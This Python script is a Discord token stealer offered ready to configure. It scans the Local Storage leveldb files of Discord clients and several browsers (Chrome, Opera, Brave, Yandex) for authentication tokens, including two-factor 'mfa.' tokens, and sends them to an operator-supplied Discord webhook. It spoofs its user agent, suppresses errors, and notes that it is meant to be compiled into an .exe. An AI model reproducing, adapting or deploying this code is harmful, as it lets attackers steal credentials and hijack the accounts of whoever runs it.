import os
import re
import json


#Do not touch anything besides the webhook_url & ping_me values unless you are experienced and know what you are doing
#-------------------------------------------------------
webhook_url = 'webhook_url_here' #Self explanatory, integrations > webhooks > copy webhook url > then paste inside ''
ping_me = True #True/False True = Pinged every time a token is grabbed | False = Not pinged every time a token is grabbed
#-------------------------------------------------------

from urllib.request import Request, urlopen

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        '`Found`: Discord Client': roaming + '\\Discord',
        '`Found`: Discord Canary': roaming + '\\discordcanary',
        '`Found`: Discord PTB': roaming + '\\discordptb',
        '`Found`: Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        '`Found`: Opera Browser': roaming + '\\Opera Software\\Opera Stable',
        '`Found`: Brave Browser': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        '`Found`: Yandex Browser': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '**`Pinned`: Tokens that start with "mfa." have 2FA enabled!**\n\n**`Pingme`: @everyone --True/False will only be applied after recompiling your .exe** \n' if ping_me else '**`Pinned`: Tokens that start with "mfa." have 2FA enabled!**\n\n**`Pingme`:** Disabled **--True/False will only be applied after recompiling your .exe\n**'

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'Token: {token}\n'
        else:
            message += '**`Error`: No Tokens Found \n**'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(webhook_url, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()